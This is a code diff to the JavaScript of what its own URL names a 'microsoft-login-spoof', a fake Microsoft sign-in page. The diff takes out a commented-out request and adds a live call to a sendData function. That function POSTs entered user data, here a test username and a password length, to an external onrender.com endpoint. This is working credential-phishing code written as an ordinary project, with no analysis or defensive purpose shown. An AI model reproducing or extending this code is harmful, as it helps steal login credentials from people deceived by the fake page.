@@ -8,18 +8,6 @@ const btnNext = document.querySelector(".firstNext");
 const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
-
-// fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
-//     method: 'POST',
-//     headers: {
-//         'Content-Type': 'application/json'
-//     },
-//     body: JSON.stringify({userName: 'test', passwordLength: 8}),
-// }).then(response => {
-//     console.log('response', response);
-// })
-
-
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
         method: 'POST',
@@ -31,6 +19,8 @@ const sendData = (data) => {
         console.log('response', response);
     })
 }
+
+sendData({userName: 'test', passwordLength: 8});
 
 function validateEmail(email) {
     const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
